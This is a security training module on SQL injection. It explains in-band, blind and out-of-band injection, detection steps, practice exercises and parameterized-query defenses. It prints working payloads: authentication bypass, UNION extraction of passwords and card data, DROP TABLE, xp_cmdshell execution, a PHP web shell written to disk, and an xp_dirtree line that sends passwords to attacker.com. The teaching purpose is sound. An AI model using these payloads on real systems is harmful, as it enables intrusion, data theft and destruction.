# SQL Injection Concepts and Exploitation

## 1. Orientation

### What this module covers
This module covers SQL Injection (SQLi)—one of the most impactful and enduring vulnerability classes in web application security. You will understand not just the mechanics of exploitation, but the underlying trust failures that make SQLi possible, why it remains prevalent despite being well-understood, and how modern defenses attempt to eliminate it.

### Fit in the Learning Path
SQL Injection is often a critical severity finding that can lead to complete database compromise, authentication bypass, and data exfiltration. Understanding SQLi is foundational to web application security—the concepts of input injection and trust boundaries apply to many other vulnerability classes.

### Learning Objectives
By the end of this module, you will:
*   Understand *why* SQL injection occurs (trust boundary failure)
*   Identify SQLi vulnerabilities through systematic testing
*   Exploit different SQLi types (in-band, blind, out-of-band)
*   Apply appropriate remediation strategies (parameterized queries, input validation)

---

## 2. Core Content

### Mental Model: Data Becomes Code

**How professionals think about this:**
SQL injection is a specific case of a general vulnerability pattern: user-controlled data crosses into a code execution context without proper sanitization. The database cannot distinguish between "this is data to store" and "this is code to execute."

```
VULNERABLE:
User Input → String Concatenation → SQL Query → Database
                                   ↓
                    "SELECT * FROM users WHERE name = '" + input + "'"
                    
                    Input: "admin'--"
                    Result: "SELECT * FROM users WHERE name = 'admin'--'"
                           (attacker terminates data, injects code)

SECURE:
User Input → Parameterized Query → SQL Query → Database
                                   ↓
                    "SELECT * FROM users WHERE name = ?"
                    Parameters: ["admin'--"]
                    
                    The database KNOWS the input is data, not code.
```

**Key insight:** The vulnerability is not in the SQL language—it's in how applications construct queries. String concatenation treats user input as trusted code. Parameterization treats user input as untrusted data.

### The Anatomy of SQL Injection

#### Basic Injection Mechanics

**Vulnerable code (PHP example):**
```php
$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "'";
$result = mysqli_query($conn, $query);
```

**Normal input:** `admin`
**Resulting query:** `SELECT * FROM users WHERE username = 'admin'`
(Works as intended)

**Malicious input:** `admin' OR '1'='1`
**Resulting query:** `SELECT * FROM users WHERE username = 'admin' OR '1'='1'`
(Returns ALL users because '1'='1' is always true)

**Malicious input:** `admin'--`
**Resulting query:** `SELECT * FROM users WHERE username = 'admin'--'`
(Comments out the rest of the query, ignoring password check if one follows)

#### Breaking Down the Payload

`' OR 1=1--`

| Component | Purpose |
|-----------|---------|
| `'` | Closes the legitimate string value |
| `OR` | SQL logical operator |
| `1=1` | Always-true condition, ensures query returns results |
| `--` | SQL comment, ignores rest of original query |

**Variations by database:**
- MySQL: `--` (with space), `#`
- PostgreSQL: `--`
- Oracle: `--`
- MSSQL: `--`, `;` for statement separation

### Types of SQL Injection

#### 1. In-Band (Classic) SQLi
Results are directly visible in the application response.

**Error-Based:** Database errors reveal internal structure
```
Input: '
Error: "You have an error in your SQL syntax... near 'ORDER BY id"
```
*Reveals: Query structure, database type*

**UNION-Based:** Append additional query results
```
URL: product?id=1 UNION SELECT username,password FROM users--
Response: Displays usernames and passwords in product listing
```

**Requirements for UNION:**
- Same number of columns as original query
- Compatible data types
- Multiple results displayed

#### 2. Blind SQL Injection
No visible output; infer information through behavior changes.

**Boolean-Based:** Different responses for TRUE/FALSE conditions
```
# If first character of password is 'a', page shows product
product?id=1 AND SUBSTRING(password,1,1)='a'--

# If page loads normally: TRUE
# If page shows error or different content: FALSE
```

**Time-Based:** Response timing reveals information
```
# If database is MySQL, wait 5 seconds
product?id=1 AND IF(1=1, SLEEP(5), 0)--

# Response takes 5 seconds: TRUE
# Response is immediate: FALSE
```

*Use case: When no visible difference exists between true/false*

#### 3. Out-of-Band (OOB) SQLi
Exfiltrate data through alternative channels (DNS, HTTP requests).

```sql
# MSSQL: Make database request our server with data
'; EXEC xp_dirtree '\\attacker.com\share\'+password+'\'--

# Data arrives as DNS query or SMB request to attacker's server
```

*Use case: Blind injection with no time-based feedback available*

### Real-World Impact Examples

**Authentication Bypass:**
```
Username: admin'--
Password: anything

Query becomes:
SELECT * FROM users WHERE username='admin'--' AND password='anything'
(Password check commented out)
```

**Data Exfiltration:**
```
product?id=1 UNION SELECT credit_card,cvv,null,null FROM payment_info--
```

**Privilege Escalation:**
```
product?id=1; UPDATE users SET role='admin' WHERE username='attacker'--
```

**Database Destruction:**
```
product?id=1; DROP TABLE users--
```

**Remote Code Execution (in some configurations):**
```sql
# MSSQL with xp_cmdshell enabled
'; EXEC xp_cmdshell 'whoami'--

# MySQL with FILE privileges
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/shell.php'--
```

### Detection Methodology

#### Step 1: Identify Injection Points
Any user-controlled input that reaches a database query:
- URL parameters (`?id=1`)
- Form fields
- Cookies
- HTTP headers (User-Agent, Referer)
- JSON/XML data in request bodies

#### Step 2: Initial Testing
Inject characters that have special meaning in SQL:

| Test | Expected if Vulnerable |
|------|----------------------|
| `'` | SQL syntax error |
| `"` | SQL syntax error |
| `;` | Query behavior change |
| `' OR '1'='1` | Authentication bypass or extra results |
| `' AND '1'='2` | No results (false condition) |

#### Step 3: Confirm and Characterize
- What database system? (Error messages, syntax differences)
- In-band or blind?
- What privileges does the database user have?
- What tables/columns exist?

#### Step 4: Exploitation
Based on injection type, extract data systematically.

### Defense: Parameterized Queries (The Right Way)

**Vulnerable (string concatenation):**
```python
query = "SELECT * FROM users WHERE id = " + user_id
cursor.execute(query)
```

**Secure (parameterized):**
```python
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_id,))
```

**Why parameterization works:**
The database *knows* the second argument is data, not code. Even if `user_id = "1; DROP TABLE users"`, the database treats the entire string as a value comparison, not as code to execute.

**Language-specific examples:**

```java
// JDBC PreparedStatement
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, username);
```

```csharp
// .NET SqlCommand
string query = "SELECT * FROM users WHERE username = @username";
SqlCommand cmd = new SqlCommand(query, conn);
cmd.Parameters.AddWithValue("@username", username);
```

```php
// PDO
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username');
$stmt->execute(['username' => $username]);
```

### Defense Layers (Defense in Depth)

| Layer | Control | Limitation |
|-------|---------|------------|
| **Primary** | Parameterized queries | None—this is the solution |
| **Secondary** | Input validation | Can't anticipate all attacks |
| **Detection** | WAF rules | Bypasses exist, false positives |
| **Reduction** | Least privilege DB users | Limits damage, doesn't prevent |
| **Monitoring** | Query logging | Detection, not prevention |

### Why SQLi Still Exists in 2024+

Despite being understood since 1998:

1. **Legacy code:** Old applications pre-date secure coding practices
2. **Developer education gaps:** Not all developers learn secure coding
3. **ORMs misused:** Developers bypass ORM protection with raw queries
4. **Dynamic query requirements:** Some applications genuinely need dynamic SQL
5. **Security deprioritized:** Time-to-market pressures override security

---

## 3. Guided Practice

### Exercise 1: Manual Exploitation (Conceptual)

Given this login form backend logic:
```sql
SELECT * FROM users WHERE username='$user' AND password='$pass'
```

Construct payloads to:

1. **Login as admin (any password):**
   - Username: ____________
   - Password: ____________

2. **Login as first user in database:**
   - Username: ____________
   - Password: ____________

3. **Cause an error that reveals database type:**
   - Username: ____________

### Exercise 2: UNION Attack Planning

A product page uses:
```
/product?id=1
```

The query is:
```sql
SELECT name, description, price FROM products WHERE id = $id
```

Plan your UNION attack:

1. How many columns does the original query return? ___
2. What data types should your UNION match? ___
3. Write a UNION payload to extract usernames and passwords from a `users` table:
   _______________

### Exercise 3: Blind SQLi Strategy

You found a blind injection point. The page shows products normally or shows "No products found."

Design a strategy to extract the first character of the admin password:

1. What boolean condition would you test?
2. How many requests (worst case) to determine one character?
3. How would you optimize this?

---

## 4. Reflection Check

### Attacker Perspective
1. You found a SQLi. How do you determine what data is most valuable to extract?

2. Why might you use time-based injection even when boolean-based is available?

3. How does a WAF change your attack strategy (not just your payloads)?

### Defender Perspective
1. A legacy application has 500 SQL queries. How do you prioritize remediation?

2. Your WAF blocks basic SQLi. Are you protected? Why or why not?

3. Database query logging shows suspicious queries. What's your IR response?

### Engineering Perspective
1. Why is input validation insufficient as the primary SQLi defense?

2. A developer argues that escaping special characters is equivalent to parameterization. Is this true? Why or why not?

3. How would you design a code review process to catch SQLi vulnerabilities before production?

---

## 5. Key Misconceptions

**MYTH: "WAFs prevent SQL injection"**
REALITY: WAFs detect known patterns. Evasion techniques bypass them. Parameterization prevents SQLi.

**MYTH: "I use an ORM, so I'm safe"**
REALITY: ORMs can be bypassed with raw queries. Developers must still understand the risk.

**MYTH: "Input validation prevents SQL injection"**
REALITY: Validation reduces attack surface but cannot anticipate all injection vectors. Parameterization is the solution.

**MYTH: "SQLi only affects the database"**
REALITY: SQLi can lead to file system access, RCE (xp_cmdshell), and lateral movement.

**MYTH: "Modern applications don't have SQLi"**
REALITY: SQLi remains in OWASP Top 10. Legacy code, misused ORMs, and developer errors ensure its persistence.

---

## 6. Completion Criteria

This module is complete when you can:

1. **Explain** why SQL injection occurs (data/code confusion)
2. **Identify** SQLi vulnerabilities through systematic testing
3. **Distinguish** between in-band, blind, and out-of-band injection
4. **Construct** appropriate payloads for different injection types
5. **Implement** parameterized queries in at least one language

---

## 7. Further Depth (Optional)

*   **Practice:** DVWA, WebGoat, HackTheBox Web challenges
*   **Tool:** Study sqlmap documentation and understand what it automates
*   **Research:** Second-order SQLi and stored procedure injection
*   **Defense:** OWASP SQL Injection Prevention Cheat Sheet
*   **Real-world:** Study the Heartland Payment Systems breach (2008) for SQLi impact
